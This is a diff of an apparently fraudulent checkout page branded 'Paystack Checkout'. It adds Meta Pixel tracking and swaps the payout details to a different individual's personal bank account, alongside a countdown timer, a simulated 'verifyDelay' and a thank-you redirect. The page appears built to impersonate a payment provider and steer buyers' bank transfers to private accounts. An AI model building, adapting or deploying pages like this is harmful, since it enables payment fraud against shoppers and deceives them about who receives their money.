@@ -53,6 +53,27 @@ src="https://www.facebook.com/tr?id=3212780128899470&ev=PageView&noscript=1"
 <!-- End Meta Pixel Code -->
 
 
+                <!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1976244773172471');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1976244773172471&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+    
+
+
 
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -857,14 +878,16 @@ const CONFIG = {
     merchantName: 'Paystack Checkout',
     amount: 16938,
     currency: 'NGN',
-    bankName: 'OPay',
-    accountNumber: '6464815669',
-    accountName: 'PS YUSUF AYOMIDE ADEKUNLE',
+    bankName: 'Kuda Mcicrofinance Bank',
+    accountNumber: '2085444421',
+    accountName: 'ADETOKUN, OPEYEMI RIDWAN',
     timerMinutes: 30,
     verifyDelay: 3500,
 
     // Facebook Pixel
     fbPixelId: '1976244773172471',
+    fbPixelId: '3212780128899470',
+    fbPixelId: '1395938711374167',
 
     // Página de obrigado (redirect após sucesso)
     thankYouUrl: 'obrigado.html',        // URL da página de obrigado (local)
